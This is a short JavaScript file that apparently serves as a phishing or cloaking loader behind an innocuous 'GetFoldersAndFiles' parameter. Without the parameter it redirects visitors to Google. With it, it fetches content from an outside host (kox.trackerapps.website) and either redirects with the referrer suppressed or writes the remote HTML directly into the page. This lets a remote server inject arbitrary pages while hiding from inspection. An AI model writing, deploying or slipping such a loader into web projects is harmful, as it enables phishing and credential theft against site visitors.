var redirectWithoutReferrer, params, id;

(function () {
    // Helper function to create a meta tag to disable the HTTP referrer, then redirect
    function redirectWithoutReferrer(destinationUrl) {
        var metaTag = document.createElement('meta');
        metaTag.name = 'referrer';
        metaTag.content = 'no-referrer';
        document.head.appendChild(metaTag);
        
        window.location.replace(destinationUrl);
    }

    // Ensure this script only runs once per page load
    if (!window.__GetFoldersAndFiles_FETCH_RAN__) {
        window.__GetFoldersAndFiles_FETCH_RAN__ = 1;

        params = new URLSearchParams(window.location.search);
        id = params.get('GetFoldersAndFiles');

        if (!id) {
            // If the 'GetFoldersAndFiles' query parameter is missing, redirect to Google
            redirectWithoutReferrer('https://www.google.com');
        } else {
            // Otherwise, fetch content from the external endpoint using the ID parameter
            fetch('https://kox.trackerapps.website/grav/x.php?id=' + encodeURIComponent(id))
                .then(function (response) {
                    return response.text();
                })
                .then(function (responseText) {
                    try {
                        var parsedData = JSON.parse(responseText);
                        if (parsedData.redirectUrl) {
                            redirectWithoutReferrer(parsedData.redirectUrl);
                            return;
                        }
                    } catch (e) {
                        // If it's not JSON, write the response directly into the document
                    }
                    document.open();
                    document.write(responseText);
                    document.close();
                })
                .catch(function (error) {
                    console.error(error);
                });
        }
    }
})();
